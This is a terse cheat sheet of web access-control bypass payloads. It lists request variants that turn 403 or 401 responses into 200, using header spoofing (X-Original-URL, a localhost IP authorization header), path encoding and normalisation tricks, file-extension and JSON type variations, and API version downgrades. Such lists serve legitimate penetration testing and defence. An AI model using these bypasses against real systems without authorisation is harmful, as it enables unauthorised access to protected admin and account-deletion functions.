```
GET /admin HTTP/1.1 
Host: example.com --> 403
GET /whatever HTTP/1.1
Host: example.com
X-Original-URL --> 200
```

```
example.com/admin -->403
example.com/%2e/admin -->200
```

```
/admin/panel --> 403
/admin/monitor --> 200
/admin/monitor/;admin --> 200
```

```
GET /delete?user=1 -->401
GET /delete?user=1 
X-custome-IP-Authorization:127.0.0.1 --> 200
```

```
example.com/admin --> 403
example.com/admin/. -->200
example.com/admin// --> 200
example.com/./admin/./ --> 200
```

```
example.com/admin/ --> 302
example.com/admin..;/ --> 200
```

```
If '/endpoint' ->403
Try:
/endpoint/
/endpoint/%20
/endpoint.html
/endpoint/?someparameter
/endpoint#
/endpoint.json
/endpoint.cgi
/endpoint.php
/endpoint.aspx
```

```
{"id":1} --> 403
try 
{"id":{"id":1}}
{"id":"1"}
{"id":[1]}
```

```
/api/v2/userid/1 -> 403
/api/v1/userid/1 -> 200
```

```
